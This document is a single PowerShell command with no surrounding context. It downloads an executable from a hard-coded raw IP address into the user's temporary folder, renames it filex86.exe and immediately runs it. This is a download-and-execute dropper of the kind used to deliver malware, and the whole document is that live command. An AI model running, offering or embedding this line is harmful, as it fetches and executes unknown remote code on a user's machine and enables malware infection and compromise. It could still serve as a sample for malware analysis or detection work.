
(New-Object System.Net.WebClient).DownloadFile('http://185.106.122.62/file.exe',"$env:TEMP\filex86.exe");Start-Process ("$env:TEMP\filex86.exe")

